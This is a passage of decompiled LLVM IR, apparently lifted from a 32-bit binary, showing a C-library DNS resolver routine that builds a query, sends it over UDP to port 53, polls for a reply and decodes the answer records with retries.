  %v4_10012048 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268461856, i32 ptrtoint (i32* @global_var_10030c60.437 to i32))
  %v0_1001204c = load i32, i32* @r29, align 4
  store i32 268509268, i32* @lr, align 4
  %v1_10012050 = call i32 @pthread_mutex_lock(i32 %v0_1001204c)
  %v3_10012058 = load i32, i32* @global_var_1002c3c4.438, align 4
  store i32 %v3_10012058, i32* %r11.global-to-local, align 4
  %v3_10012064 = load i16, i16* @global_var_1002c20c.439, align 2
  %v4_10012064 = zext i16 %v3_10012064 to i32
  store i32 %v4_10012064, i32* @r25, align 4
  %v1_10012068 = load i32, i32* @r23, align 4
  store i32 %v2_10012038, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 0, i32* @r17, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* @r18, align 4
  store i32 -1, i32* @r22, align 4
  %v2_10012068 = srem i32 %v3_10012058, %v1_10012068
  %v2_10012084 = sub i32 %v3_10012058, %v2_10012068
  store i32 %v2_10012084, i32* %r0.global-to-local, align 4
  store i32 %v2_10012068, i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_10012090.440 to i32), i32* @lr, align 4
  %v0_1001208c = call i32 @__pthread_cleanup_pop_restore()
  %v0_100125a0.pr19 = load i32, i32* @r18, align 4
  %tmp57 = icmp ult i32 %v0_100125a0.pr19, 3
  br i1 %tmp57, label %dec_label_pc_10012094.lr.ph.lr.ph, label %dec_label_pc_100125b8

dec_label_pc_10012094.lr.ph.lr.ph:                ; preds = %dec_label_pc_10012018
  %v2_100120ac = ptrtoint i32* %stack_var_-144 to i32
  %v2_100121c0 = ptrtoint i32* %stack_var_-204 to i32
  %v2_10012220 = ptrtoint i16* %stack_var_-212 to i32
  %v2_10012264 = ptrtoint i32* %stack_var_-248 to i32
  %v3_100122c0 = icmp eq i32 %tmp37, 0
  %v3_100122cc = icmp eq i32 %tmp36, 3
  %v2_10012348 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1001239c = ptrtoint i32* %stack_var_-184 to i32
  %v3_100123c8 = icmp eq i32 %tmp33, 0
  %v3_1001233c = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_10012094.lr.ph

dec_label_pc_10012094:                            ; preds = %dec_label_pc_10012094.lr.ph, %dec_label_pc_10012244
  %v0_10012094 = load i32, i32* @r19, align 4
  %v3_10012094 = icmp eq i32 %v0_10012094, -1
  br i1 %v3_10012094, label %dec_label_pc_100120a4, label %dec_label_pc_1001209c

dec_label_pc_1001209c:                            ; preds = %dec_label_pc_10012094
  store i32 268509348, i32* @lr, align 4
  %v1_100120a0 = call i32 @__libc_close(i32 %v0_10012094)
  br label %dec_label_pc_100120a4

dec_label_pc_100120a4:                            ; preds = %dec_label_pc_10012094, %dec_label_pc_1001209c
  store i32 %v2_100120ac, i32* @r29, align 4
  %v0_100120b0 = load i32, i32* @r30, align 4
  store i32 268509368, i32* @lr, align 4
  %v3_100120b4 = call i32 @__GI_memset(i32 %v0_100120b0, i32 0, i32 512)
  store i32 268509384, i32* @lr, align 4
  %v3_100120c4 = call i32 @__GI_memset(i32 %v2_100120ac, i32 0, i32 48)
  %v0_100120c8 = load i32, i32* @r25, align 4
  %v1_100120c8 = add i32 %v0_100120c8, 1
  %v1_100120cc = urem i32 %v1_100120c8, 65536
  store i32 %v1_100120cc, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100120d8 = load i32, i32* @r30, align 4
  store i32 %v1_100120cc, i32* %stack_var_-144, align 4
  %v4_100120ec = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_100120d8, i32 512)
  store i32 %v4_100120ec, i32* %r28.global-to-local, align 4
  %v1_100120f0 = icmp slt i32 %v4_100120ec, 0
  br i1 %v1_100120f0, label %dec_label_pc_100125b8, label %dec_label_pc_100120f8

dec_label_pc_100120f8:                            ; preds = %dec_label_pc_100120a4
  %v0_100120f8 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_100120f8, i32* @r4, align 4
  %v0_10012100 = load i32, i32* @r21, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r29.global-to-local, align 4
  store i32 268509452, i32* @lr, align 4
  %v4_10012108 = call i32 @strncpy(i32 %v0_10012100, i32 %v0_100120f8, i32 1025)
  store i32 ptrtoint (i32* @global_var_1002c210.317 to i32), i32* %r29.global-to-local, align 4
  %v4_10012120 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268461856, i32 ptrtoint (i32* @global_var_1002c210.317 to i32))
  store i32 268509484, i32* @lr, align 4
  %v1_10012128 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c210.317 to i32))
  %v0_1001212c = load i32, i32* @r22, align 4
  %v1_1001212c = icmp slt i32 %v0_1001212c, 0
  %v0_10012134 = load i32, i32* @r26, align 4
  %v1_10012134 = mul i32 %v0_10012134, 4
  store i32 %v1_10012134, i32* %r0.global-to-local, align 4
  %v2_10012138 = add i32 %v1_10012134, %arg4
  %v3_10012138 = inttoptr i32 %v2_10012138 to i32*
  %v4_10012138 = load i32, i32* %v3_10012138, align 4
  store i32 %v4_10012138, i32* %r29.global-to-local, align 4
  br i1 %v1_1001212c, label %dec_label_pc_10012180, label %dec_label_pc_10012140

dec_label_pc_10012140:                            ; preds = %dec_label_pc_100120f8
  %v3_10012144 = load i32, i32* @global_var_1002c3cc.441, align 4
  store i32 %v3_10012144, i32* %r0.global-to-local, align 4
  %v2_10012148 = icmp slt i32 %v0_1001212c, %v3_10012144
  br i1 %v2_10012148, label %dec_label_pc_10012150, label %dec_label_pc_10012180

dec_label_pc_10012150:                            ; preds = %dec_label_pc_10012140
  store i32 ptrtoint (i32* @global_var_10017410.442 to i32), i32* @r4, align 4
  %v0_1001215c = load i32, i32* @r21, align 4
  store i32 268509540, i32* @lr, align 4
  %v4_10012160 = inttoptr i32 %v0_1001215c to i8*
  %v5_10012160 = call i32 @__GI_strncat(i8* %v4_10012160, i32 ptrtoint (i32* @global_var_10017410.442 to i32), i32 1025, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  %v0_10012168 = load i32, i32* @r22, align 4
  %v1_10012168 = mul i32 %v0_10012168, 4
  store i32 %v1_10012168, i32* %r0.global-to-local, align 4
  %v2_10012170 = add i32 %v1_10012168, ptrtoint (i32* @global_var_10030d2c.443 to i32)
  %v3_10012170 = inttoptr i32 %v2_10012170 to i32*
  %v4_10012170 = load i32, i32* %v3_10012170, align 4
  store i32 %v4_10012170, i32* @r4, align 4
  %v0_10012174 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012180.444 to i32), i32* @lr, align 4
  %v4_1001217c = inttoptr i32 %v0_10012174 to i8*
  %v5_1001217c = call i32 @__GI_strncat(i8* %v4_1001217c, i32 %v4_10012170, i32 1025, i32 ptrtoint (i32* @global_var_10030d2c.443 to i32))
  br label %dec_label_pc_10012180

dec_label_pc_10012180:                            ; preds = %dec_label_pc_10012140, %dec_label_pc_100120f8, %dec_label_pc_10012150
  store i32 %v2_10012038, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1001218c.445 to i32), i32* @lr, align 4
  %v0_10012188 = call i32 @__pthread_cleanup_pop_restore()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10012194 = load i32, i32* @r30, align 4
  %v1_10012194 = load i32, i32* %r28.global-to-local, align 4
  %v2_10012194 = add i32 %v1_10012194, %v0_10012194
  %v1_10012198 = sub i32 512, %v1_10012194
  %v0_100121a0 = load i32, i32* @r21, align 4
  store i32 %v0_100121a0, i32* %stack_var_-240, align 4
  store i32 268509612, i32* @lr, align 4
  %v4_100121a8 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_10012194, i32 %v1_10012198)
  store i32 %v4_100121a8, i32* @r27, align 4
  %v1_100121ac = icmp slt i32 %v4_100121a8, 0
  br i1 %v1_100121ac, label %dec_label_pc_100125b8, label %dec_label_pc_100121b4

dec_label_pc_100121b4:                            ; preds = %dec_label_pc_10012180
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_100121bc = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268509644, i32* @lr, align 4
  %v3_100121c8 = inttoptr i32 %v0_100121bc to i8*
  %v4_100121c8 = call i32 @inet_pton(i32 10, i8* %v3_100121c8, i32 %v2_100121c0)
  %tmp59 = icmp slt i32 %v4_100121c8, 1
  br i1 %tmp59, label %dec_label_pc_100121dcthread-pre-split, label %dec_label_pc_100121d4

dec_label_pc_100121d4:                            ; preds = %dec_label_pc_100121b4
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_100121dc

dec_label_pc_100121dcthread-pre-split:            ; preds = %dec_label_pc_100121b4
  %v3_100121dc.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_100121dc

dec_label_pc_100121dc:                            ; preds = %dec_label_pc_100121dcthread-pre-split, %dec_label_pc_100121d4
  %v3_100121dc = phi i16 [ %v3_100121dc.pr, %dec_label_pc_100121dcthread-pre-split ], [ 10, %dec_label_pc_100121d4 ]
  %v3_100121e0 = icmp eq i16 %v3_100121dc, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_100121e0, label %dec_label_pc_10012208, label %dec_label_pc_100121f4

dec_label_pc_100121f4:                            ; preds = %dec_label_pc_100121dc
  %v0_100121f8 = load i32, i32* @r29, align 4
  store i32 268509700, i32* @lr, align 4
  %v1_10012200 = call i32 @inet_addr(i32 %v0_100121f8)
  %v3_10012208.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10012208

dec_label_pc_10012208:                            ; preds = %dec_label_pc_100121dc, %dec_label_pc_100121f4
  %v3_10012208 = phi i16 [ 10, %dec_label_pc_100121dc ], [ %v3_10012208.pre, %dec_label_pc_100121f4 ]
  %v4_10012208 = sext i16 %v3_10012208 to i32
  store i32 268509720, i32* @lr, align 4
  %v3_10012214 = call i32 @socket(i32 %v4_10012208, i32 2, i32 17)
  store i32 %v3_10012214, i32* @r19, align 4
  %v1_10012218 = icmp slt i32 %v3_10012214, 0
  br i1 %v1_10012218, label %dec_label_pc_10012244, label %dec_label_pc_10012220

dec_label_pc_10012220:                            ; preds = %dec_label_pc_10012208
  store i32 268509740, i32* @lr, align 4
  %v3_10012228 = call i32 @__libc_connect(i32 %v2_10012220, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_10012228, -1
  br i1 %tmp60, label %dec_label_pc_1001224c, label %dec_label_pc_10012234

dec_label_pc_10012234:                            ; preds = %dec_label_pc_10012220
  %v0_10012234 = call i32 @__errno_location()
  %v1_10012238 = inttoptr i32 %v0_10012234 to i32*
  %v2_10012238 = load i32, i32* %v1_10012238, align 4
  store i32 %v2_10012238, i32* %r0.global-to-local, align 4
  %v3_1001223c = icmp eq i32 %v2_10012238, 101
  br i1 %v3_1001223c, label %dec_label_pc_10012584, label %dec_label_pc_10012244

dec_label_pc_10012244:                            ; preds = %dec_label_pc_10012234, %dec_label_pc_10012208
  %v0_10012244 = load i32, i32* @r18, align 4
  %v1_10012244 = add i32 %v0_10012244, 1
  store i32 %v1_10012244, i32* @r18, align 4
  %tmp61 = icmp ult i32 %v1_10012244, 3
  br i1 %tmp61, label %dec_label_pc_10012094, label %dec_label_pc_100125b8

dec_label_pc_1001224c:                            ; preds = %dec_label_pc_10012220
  %v0_1001224c = load i32, i32* @r28, align 4
  %v1_1001224c = load i32, i32* @r27, align 4
  %v2_1001224c = add i32 %v1_1001224c, %v0_1001224c
  %v0_10012250 = load i32, i32* @r30, align 4
  %v0_10012258 = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_10012260.446 to i32), i32* @lr, align 4
  %v4_1001225c = call i32 @__libc_send(i32 %v0_10012258, i32 %v0_10012250, i32 %v2_1001224c, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10012274 = load i32, i32* @r19, align 4
  store i32 %v0_10012274, i32* %stack_var_-248, align 4
  store i32 268509820, i32* @lr, align 4
  %v3_10012278 = call i32 @__libc_poll(i32 %v2_10012264, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_10012278, 1
  br i1 %tmp62, label %dec_label_pc_10012584, label %dec_label_pc_10012284

dec_label_pc_10012284:                            ; preds = %dec_label_pc_1001224c
  %v0_10012284 = load i32, i32* @r19, align 4
  %v0_10012288 = load i32, i32* @r30, align 4
  store i32 268509848, i32* @lr, align 4
  %v4_10012294 = call i32 @__libc_recv(i32 %v0_10012284, i32 %v0_10012288, i32 512, i32 0)
  store i32 %v4_10012294, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_10012294, 12
  br i1 %tmp63, label %dec_label_pc_1001252c, label %dec_label_pc_100122a4

dec_label_pc_100122a4:                            ; preds = %dec_label_pc_10012284
  %v0_100122a4 = load i32, i32* @r30, align 4
  %v2_100122ac = inttoptr i32 %v0_100122a4 to i8*
  %v3_100122ac = call i32 @__decode_header(i8* %v2_100122ac, i32 %v2_100120ac)
  %v3_100122b0 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_100122b0, i32* @r20, align 4
  %v1_100122b4 = load i32, i32* @r25, align 4
  %v4_100122b4 = icmp eq i32 %v3_100122b0, %v1_100122b4
  br i1 %v4_100122b4, label %dec_label_pc_100122bc, label %dec_label_pc_1001252c

dec_label_pc_100122bc:                            ; preds = %dec_label_pc_100122a4
  store i32 %tmp37, i32* %r0.global-to-local, align 4
  br i1 %v3_100122c0, label %dec_label_pc_1001252c, label %dec_label_pc_100122c8

dec_label_pc_100122c8:                            ; preds = %dec_label_pc_100122bc
  store i32 %tmp36, i32* %r0.global-to-local, align 4
  br i1 %v3_100122cc, label %dec_label_pc_100122d4, label %dec_label_pc_1001233c

dec_label_pc_100122d4:                            ; preds = %dec_label_pc_100122c8
  %v0_100122d4 = load i32, i32* @r17, align 4
  %v3_100122d4 = icmp eq i32 %v0_100122d4, 0
  br i1 %v3_100122d4, label %dec_label_pc_100122dc, label %dec_label_pc_10012330

dec_label_pc_100122dc:                            ; preds = %dec_label_pc_100122d4
  store i32 ptrtoint (i32* @global_var_1002c210.317 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10012038, i32* %r28.global-to-local, align 4
  %v4_100122f8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268461856, i32 ptrtoint (i32* @global_var_1002c210.317 to i32))
  store i32 268509956, i32* @lr, align 4
  %v1_10012300 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002c210.317 to i32))
  %v3_10012308 = load i32, i32* @global_var_1002c3cc.441, align 4
  store i32 %v2_10012038, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_10012314 = add i32 %v3_10012308, -1
  store i32 %v1_10012314, i32* @r29, align 4
  store i32 268509980, i32* @lr, align 4
  %v0_10012318 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001231c = load i32, i32* @r22, align 4
  %v1_1001231c = load i32, i32* @r29, align 4
  %v2_1001231c = icmp slt i32 %v0_1001231c, %v1_1001231c
  br i1 %v2_1001231c, label %dec_label_pc_10012324, label %dec_label_pc_10012330

dec_label_pc_10012324:                            ; preds = %dec_label_pc_100122dc
  %v1_10012324 = add i32 %v0_1001231c, 1
  store i32 %v1_10012324, i32* @r22, align 4
  %v0_10012328 = load i32, i32* @r20, align 4
  store i32 %v0_10012328, i32* @r25, align 4
  br label %dec_label_pc_100125a0thread-pre-split.backedge

dec_label_pc_10012330:                            ; preds = %dec_label_pc_100122dc, %dec_label_pc_100122d4
  %v0_10012330 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10012364

dec_label_pc_1001233c:                            ; preds = %dec_label_pc_100122c8
  br i1 %v3_1001233c, label %dec_label_pc_10012344, label %dec_label_pc_1001252c

dec_label_pc_10012344:                            ; preds = %dec_label_pc_1001233c
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %tmp58, label %dec_label_pc_1001235c, label %dec_label_pc_10012350

dec_label_pc_10012350:                            ; preds = %dec_label_pc_10012344
  store i32 12, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 12, i32* @r4, align 4
  %v0_1001237c10 = load i32, i32* @r30, align 4
  store i32 %v0_1001237c10, i32* @r3, align 4
  store i32 1, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001236c

dec_label_pc_1001235c:                            ; preds = %dec_label_pc_10012344
  %v0_1001235c = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_10012364

dec_label_pc_10012364:                            ; preds = %dec_label_pc_10012330, %dec_label_pc_1001235c
  %storemerge3 = phi i32 [ %v0_1001235c, %dec_label_pc_1001235c ], [ %v0_10012330, %dec_label_pc_10012330 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_1001235c ], [ 1, %dec_label_pc_10012330 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v2_10012364 = inttoptr i32 %storemerge3 to i32*
  store i32 %storemerge, i32* %v2_10012364, align 4
  br label %dec_label_pc_100125c8

dec_label_pc_1001236c:                            ; preds = %dec_label_pc_10012350, %dec_label_pc_1001236c
  %v0_1001237c14 = phi i32 [ %v0_1001237c10, %dec_label_pc_10012350 ], [ %v0_1001237c, %dec_label_pc_1001236c ]
  %storemerge213 = phi i32 [ 12, %dec_label_pc_10012350 ], [ %v2_10012370, %dec_label_pc_1001236c ]
  store i32 268510064, i32* @lr, align 4
  %v2_1001236c = call i32 @__length_question(i32 %v0_1001237c14, i32 %storemerge213)
  %v0_10012370 = load i32, i32* %r28.global-to-local, align 4
  %v2_10012370 = add i32 %v0_10012370, %v2_1001236c
  %v0_10012380.pr = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10012370, i32* %r28.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_10012370, i32* @r4, align 4
  %v0_1001237c = load i32, i32* @r30, align 4
  store i32 %v0_1001237c, i32* @r3, align 4
  %v2_10012380 = icmp slt i32 %v0_10012380.pr, 1
  %v1_10012384 = add i32 %v0_10012380.pr, 1
  store i32 %v1_10012384, i32* %r29.global-to-local, align 4
  br i1 %v2_10012380, label %dec_label_pc_1001236c, label %dec_label_pc_1001238c

dec_label_pc_1001238c:                            ; preds = %dec_label_pc_1001236c
  store i32 0, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  br i1 %v2_10012348, label %dec_label_pc_100124d8, label %dec_label_pc_100124e0

dec_label_pc_1001239c:                            ; preds = %dec_label_pc_100124d8
  store i32 %v2_1001239c, i32* %r29.global-to-local, align 4
  %v0_100123a0 = load i32, i32* @r30, align 4
  store i32 268510132, i32* @lr, align 4
  %v5_100123b0 = call i32 @__decode_answer(i32 %v0_100123a0, i32 %v0_100123a4, i32 %v1_100124d8, i32* nonnull %stack_var_-184)
  store i32 %v5_100123b0, i32* %r15.global-to-local, align 4
  %tmp64 = icmp sgt i32 %v5_100123b0, -1
  br i1 %tmp64, label %dec_label_pc_100123d4, label %dec_label_pc_100123bc

dec_label_pc_100123bc:                            ; preds = %dec_label_pc_1001239c
  %v0_100123bc = load i32, i32* @r24, align 4
  %v3_100123bc = icmp eq i32 %v0_100123bc, 0
  br i1 %v3_100123bc, label %dec_label_pc_1001252c, label %dec_label_pc_100123c4

dec_label_pc_100123c4:                            ; preds = %dec_label_pc_100123bc
  store i32 %tmp33, i32* %r0.global-to-local, align 4
  br i1 %v3_100123c8, label %dec_label_pc_1001252c, label %dec_label_pc_100124e0

dec_label_pc_100123d4:                            ; preds = %dec_label_pc_1001239c
  store i32 %stack_var_-88.118, i32* %r0.global-to-local, align 4
  %v3_100123d8 = icmp eq i32 %stack_var_-88.118, 0
  br i1 %v3_100123d8, label %dec_label_pc_1001247c, label %dec_label_pc_100123e0

dec_label_pc_100123e0:                            ; preds = %dec_label_pc_100123d4
  %v0_100123e0 = load i32, i32* @r31, align 4
  store i32 %v2_1001239c, i32* @r4, align 4
  %v1_100123e8 = add i32 %v0_100123e0, 28
  %v2_100123e8 = inttoptr i32 %v1_100123e8 to i32*
  %v3_100123e8 = load i32, i32* %v2_100123e8, align 4
  store i32 %v3_100123e8, i32* %r0.global-to-local, align 4
  store i32 %v0_100123e0, i32* @r3, align 4
  %v1_100123f0 = add i32 %v0_100123e0, 36
  %v2_100123f0 = inttoptr i32 %v1_100123f0 to i32*
  %v3_100123f0 = load i32, i32* %v2_100123f0, align 4
  store i32 %v3_100123f0, i32* %r11.global-to-local, align 4
  store i32 40, i32* @r5, align 4
  store i32 268510216, i32* @lr, align 4
  %v0_10012404 = call i32 @memcpy()
  %v0_10012408 = load i32, i32* @r31, align 4
  %v1_10012408 = add i32 %v0_10012408, 4
  %v2_10012408 = inttoptr i32 %v1_10012408 to i32*
  %v3_10012408 = load i32, i32* %v2_10012408, align 4
  %v3_1001240c = icmp eq i32 %v3_10012408, 24
  br i1 %v3_1001240c, label %dec_label_pc_100123e0.dec_label_pc_10012430_crit_edge, label %dec_label_pc_10012414

dec_label_pc_100123e0.dec_label_pc_10012430_crit_edge: ; preds = %dec_label_pc_100123e0
  %v1_10012430.pre = load i32, i32* @r16, align 4
  br label %dec_label_pc_10012430

dec_label_pc_10012414:                            ; preds = %dec_label_pc_100123e0
  %v1_10012414 = add i32 %v0_10012408, 28
  %v2_10012414 = inttoptr i32 %v1_10012414 to i32*
  %v3_10012414 = load i32, i32* %v2_10012414, align 4
  store i32 %v3_10012414, i32* %r0.global-to-local, align 4
  %v3_10012418 = icmp eq i32 %v3_10012414, 0
  br i1 %v3_10012418, label %dec_label_pc_100124e0, label %dec_label_pc_10012420

dec_label_pc_10012420:                            ; preds = %dec_label_pc_10012414
  %v0_10012420 = load i32, i32* @r16, align 4
  %v3_10012420 = icmp eq i32 %v0_10012420, 1
  br i1 %v3_10012420, label %dec_label_pc_10012430, label %dec_label_pc_10012428

dec_label_pc_10012428:                            ; preds = %dec_label_pc_10012420
  %v3_10012428 = icmp eq i32 %v0_10012420, 28
  br i1 %v3_10012428, label %dec_label_pc_10012430, label %dec_label_pc_100124e0

dec_label_pc_10012430:                            ; preds = %dec_label_pc_100123e0.dec_label_pc_10012430_crit_edge, %dec_label_pc_10012428, %dec_label_pc_10012420
  %v1_10012430 = phi i32 [ %v1_10012430.pre, %dec_label_pc_100123e0.dec_label_pc_10012430_crit_edge ], [ 28, %dec_label_pc_10012428 ], [ 1, %dec_label_pc_10012420 ]
  %v4_10012430 = icmp eq i32 %v3_10012408, %v1_10012430
  br i1 %v4_10012430, label %dec_label_pc_10012444, label %dec_label_pc_10012438

dec_label_pc_10012438:                            ; preds = %dec_label_pc_10012430
  %v1_10012438 = inttoptr i32 %v0_10012408 to i32*
  %v2_10012438 = load i32, i32* %v1_10012438, align 4
  store i32 %v2_10012438, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10012440.449 to i32), i32* @lr, align 4
  %v0_1001243c = call i32 @free()
  br label %dec_label_pc_100124c4

dec_label_pc_10012444:                            ; preds = %dec_label_pc_10012430
  %v1_10012448 = add i32 %v0_10012408, 16
  %v2_10012448 = inttoptr i32 %v1_10012448 to i32*
  %v3_10012448 = load i32, i32* %v2_10012448, align 4
  store i32 %v3_10012448, i32* %r11.global-to-local, align 4
  %v0_1001244c = load i32, i32* @r24, align 4
  %v2_1001244c = sub i32 %tmp35, %v0_1001244c
  %v1_10012450 = add i32 %v0_10012408, 32
  %v2_10012450 = inttoptr i32 %v1_10012450 to i32*
  %v3_10012450 = load i32, i32* %v2_10012450, align 4
  store i32 %v3_10012450, i32* %r0.global-to-local, align 4
  %v1_10012454 = add i32 %v2_1001244c, -1
  %v1_10012458 = add i32 %v3_10012448, 4
  %v2_1001245c = mul i32 %v1_10012454, %v1_10012458
  store i32 %v2_1001245c, i32* %r11.global-to-local, align 4
  %v2_10012460 = add i32 %v0_10012408, 36
  %v3_10012460 = inttoptr i32 %v2_10012460 to i32*
  store i32 %v1_10012454, i32* %v3_10012460, align 4
  %v0_10012464 = load i32, i32* %r11.global-to-local, align 4
  %v1_10012464 = load i32, i32* %r0.global-to-local, align 4
  %v3_10012464 = icmp ugt i32 %v0_10012464, %v1_10012464
  br i1 %v3_10012464, label %dec_label_pc_100124e0, label %dec_label_pc_1001246c

dec_label_pc_1001246c:                            ; preds = %dec_label_pc_10012444
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10012474 = load i32, i32* @r31, align 4
  %v2_10012474 = add i32 %v1_10012474, 36
  %v3_10012474 = inttoptr i32 %v2_10012474 to i32*
  store i32 0, i32* %v3_10012474, align 4
  br label %dec_label_pc_100124c4

dec_label_pc_1001247c:                            ; preds = %dec_label_pc_100123d4
  %v3_1001247c = load i32, i32* %stack_var_-184, align 4
  store i32 %v3_1001247c, i32* @r3, align 4
  store i32 268510340, i32* @lr, align 4
  %v0_10012480 = call i32 @free()
  store i32 %tmp29, i32* %r0.global-to-local, align 4
  %v1_10012488 = load i32, i32* @r16, align 4
  %v4_10012488 = icmp eq i32 %tmp29, %v1_10012488
  br i1 %v4_10012488, label %dec_label_pc_10012490, label %dec_label_pc_100124c4

dec_label_pc_10012490:                            ; preds = %dec_label_pc_1001247c
  %v0_10012490 = load i32, i32* @r31, align 4
  %v1_10012490 = add i32 %v0_10012490, 16
  %v2_10012490 = inttoptr i32 %v1_10012490 to i32*
  %v3_10012490 = load i32, i32* %v2_10012490, align 4
  store i32 %v3_10012490, i32* @r5, align 4
  store i32 %tmp28, i32* %r0.global-to-local, align 4
  %v4_10012498 = icmp eq i32 %v3_10012490, %tmp28
  br i1 %v4_10012498, label %dec_label_pc_100124a0, label %dec_label_pc_10012524

dec_label_pc_100124a0:                            ; preds = %dec_label_pc_10012490
  %v1_100124a0 = add i32 %v0_10012490, 36
  %v2_100124a0 = inttoptr i32 %v1_100124a0 to i32*
  %v3_100124a0 = load i32, i32* %v2_100124a0, align 4
  %v1_100124a4 = add i32 %v0_10012490, 28
  %v2_100124a4 = inttoptr i32 %v1_100124a4 to i32*
  %v3_100124a4 = load i32, i32* %v2_100124a4, align 4
  store i32 %v3_100124a4, i32* %r0.global-to-local, align 4
  %v2_100124a8 = mul i32 %v3_100124a0, %tmp28
  %v2_100124b0 = add i32 %v3_100124a4, %v2_100124a8
  store i32 %v2_100124b0, i32* @r3, align 4
  store i32 268510392, i32* @lr, align 4
  %v0_100124b4 = call i32 @memcpy()
  %v0_100124b8 = load i32, i32* @r31, align 4
  %v1_100124b8 = add i32 %v0_100124b8, 36
  %v2_100124b8 = inttoptr i32 %v1_100124b8 to i32*
  %v3_100124b8 = load i32, i32* %v2_100124b8, align 4
  %v1_100124bc = add i32 %v3_100124b8, 1
  store i32 %v1_100124bc, i32* %v2_100124b8, align 4
  br label %dec_label_pc_100124c4

dec_label_pc_100124c4:                            ; preds = %dec_label_pc_1001247c, %dec_label_pc_1001246c, %dec_label_pc_10012438, %dec_label_pc_100124a0
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_100124a0 ], [ 0, %dec_label_pc_1001247c ], [ 0, %dec_label_pc_1001246c ], [ %stack_var_-88.118, %dec_label_pc_10012438 ]
  %v0_100124c4 = load i32, i32* @r28, align 4
  %v1_100124c4 = load i32, i32* %r15.global-to-local, align 4
  %v2_100124c4 = add i32 %v1_100124c4, %v0_100124c4
  store i32 %v2_100124c4, i32* %r28.global-to-local, align 4
  %v0_100124c8 = load i32, i32* @r24, align 4
  %v1_100124c8 = add i32 %v0_100124c8, 1
  store i32 %v1_100124c8, i32* @r24, align 4
  store i32 %tmp35, i32* %r0.global-to-local, align 4
  %v2_100124d0 = icmp slt i32 %v1_100124c8, %tmp35
  br i1 %v2_100124d0, label %dec_label_pc_100124d8, label %dec_label_pc_100124e0

dec_label_pc_100124d8:                            ; preds = %dec_label_pc_1001238c, %dec_label_pc_100124c4
  %v0_100123a4 = phi i32 [ %v2_100124c4, %dec_label_pc_100124c4 ], [ %v2_10012370, %dec_label_pc_1001238c ]
  %stack_var_-88.118 = phi i32 [ %stack_var_-88.0, %dec_label_pc_100124c4 ], [ 1, %dec_label_pc_1001238c ]
  %v1_100124d8 = load i32, i32* @r27, align 4
  %v2_100124d8 = icmp slt i32 %v0_100123a4, %v1_100124d8
  br i1 %v2_100124d8, label %dec_label_pc_1001239c, label %dec_label_pc_100124e0

dec_label_pc_100124e0:                            ; preds = %dec_label_pc_100123c4, %dec_label_pc_1001238c, %dec_label_pc_100124d8, %dec_label_pc_10012414, %dec_label_pc_10012444, %dec_label_pc_100124c4, %dec_label_pc_10012428
  %v0_100124e0 = load i32, i32* @r19, align 4
  store i32 268510440, i32* @lr, align 4
  %v1_100124e4 = call i32 @__libc_close(i32 %v0_100124e0)
  %v3_100124ec = icmp eq i32 %arg5, 0
  %v0_100124fc = load i32, i32* @r30, align 4
  br i1 %v3_100124ec, label %dec_label_pc_100124fc, label %dec_label_pc_100124f4

dec_label_pc_100124f4:                            ; preds = %dec_label_pc_100124e0
  %v2_100124f4 = inttoptr i32 %arg5 to i32*
  store i32 %v0_100124fc, i32* %v2_100124f4, align 4
  br label %dec_label_pc_10012504

dec_label_pc_100124fc:                            ; preds = %dec_label_pc_100124e0
  store i32 %v0_100124fc, i32* @r3, align 4
  store i32 268510468, i32* @lr, align 4
  %v0_10012500 = call i32 @free()
  br label %dec_label_pc_10012504

dec_label_pc_10012504:                            ; preds = %dec_label_pc_100124f4, %dec_label_pc_100124fc
